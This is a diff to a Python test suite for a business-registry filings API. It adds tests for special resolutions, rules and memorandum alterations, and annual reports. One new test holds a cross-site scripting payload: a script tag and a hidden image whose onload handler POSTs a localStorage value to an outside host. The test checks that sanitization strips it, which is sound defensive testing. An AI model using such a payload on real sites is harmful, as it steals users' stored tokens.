@@ -42,7 +42,7 @@ from registry_schemas.example_data import (
     INCORPORATION,
     INCORPORATION_FILING_TEMPLATE,
     SPECIAL_RESOLUTION,
-    TRANSITION_FILING_TEMPLATE,
+    TRANSITION_FILING_TEMPLATE
 )
 
 from legal_api.models import Business, Filing, RegistrationBootstrap, UserRoles
@@ -246,6 +246,30 @@ def test_post_allowed_historical(session, client, jwt):
                      )
 
     assert rv.status_code == HTTPStatus.CREATED
+
+
+def test_special_resolution_sanitation(session, client, jwt):
+    """Assert that script tags can't be passed into special resolution resolution field."""
+    identifier = 'BC7654399'
+    factory_business(identifier, state=Business.State.ACTIVE)
+
+    data = copy.deepcopy(FILING_HEADER)
+    data['filing']['header']['name'] = 'specialResolution'
+    data['filing']['specialResolution'] = copy.deepcopy(SPECIAL_RESOLUTION)
+    data['filing']['specialResolution']['resolution'] = """
+        <p>Hello this is great</p><script>alert("hello")</script>
+        <img
+            src="https://www.google.ca"
+            style="display:none"
+            onload="fetch('https://www.google.ca', {method: 'POST', body: localStorage.getItem('rfdsfds432432423423')})"
+        >
+        """
+    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
+                     json=data,
+                     headers=create_header(jwt, [STAFF_ROLE], 'user')
+                     )
+    assert rv.status_code == HTTPStatus.CREATED
+    assert rv.json['filing']['specialResolution']['resolution'] == ' <p>Hello this is great</p> '
 
 
 def test_post_draft_ar(session, client, jwt):
@@ -876,7 +900,7 @@ def test_update_ar_with_a_missing_filing_id_fails(session, client, jwt):
     ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
     ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    filings = factory_filing(business, ar)
+    filings = factory_completed_filing(business, ar)
 
     rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
                     json=ar,
@@ -884,7 +908,6 @@ def test_update_ar_with_a_missing_filing_id_fails(session, client, jwt):
                     )
 
     assert rv.status_code == HTTPStatus.NOT_FOUND
-    assert rv.json['errors'][0] == {'message': f'{identifier} no filings found'}
 
 
 def test_update_ar_with_a_missing_business_id_fails(session, client, jwt):
@@ -1279,14 +1302,23 @@ def test_coa(session, requests_mock, client, jwt, test_name, legal_type, identif
     else:
         assert 'futureEffectiveDate' not in rv.json['filing']['header']
 
-def test_rules_in_sr(session, requests_mock, client, jwt):
+
+def test_rules_memorandum_in_sr(session, mocker, requests_mock, client, jwt, ):
     """Assert if both rules update in sr, and rules file key is provided"""
+    mocker.patch('legal_api.services.filings.validations.alteration.validate_pdf',
+                 return_value=[])
+
     identifier = 'CP1234567'
-    b = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR), None, Business.LegalTypes.COOP.value)
+    b = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR*10), None, Business.LegalTypes.COOP.value)
+    factory_business_mailing_address(b)
     sr = copy.deepcopy(CP_SPECIAL_RESOLUTION_TEMPLATE)
+    del sr['filing']['changeOfName']
     sr['filing']['alteration'] = {}
     sr['filing']['alteration']['rulesFileKey'] = 'some_key'
-    sr['filing']['alteration']['rulesChangeInSR'] = True
+    sr['filing']['alteration']['business'] = {
+        'legalType': 'CP'
+    }
+    sr['filing']['alteration']['rulesInResolution'] = True
 
     sr['filing']['business']['identifier'] = identifier
 
@@ -1295,3 +1327,19 @@ def test_rules_in_sr(session, requests_mock, client, jwt):
                      headers=create_header(jwt, [STAFF_ROLE], identifier)
                      )
     assert rv.status_code == HTTPStatus.BAD_REQUEST
+    assert rv.json.get('errors')
+    error = 'Cannot provide both file upload and rules change in SR'
+    assert rv.json.get('errors')[0].get('error') == error
+
+    sr['filing']['alteration']['memorandumFileKey'] = 'some_key'
+    sr['filing']['alteration']['memorandumInResolution'] = True
+    sr['filing']['alteration']['rulesInResolution'] = False
+
+    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                     json=sr,
+                     headers=create_header(jwt, [STAFF_ROLE], identifier)
+                     )
+    assert rv.status_code == HTTPStatus.BAD_REQUEST
+    assert rv.json.get('errors')
+    error = 'Cannot provide both file upload and memorandum change in SR'
+    assert rv.json.get('errors')[0].get('error') == error
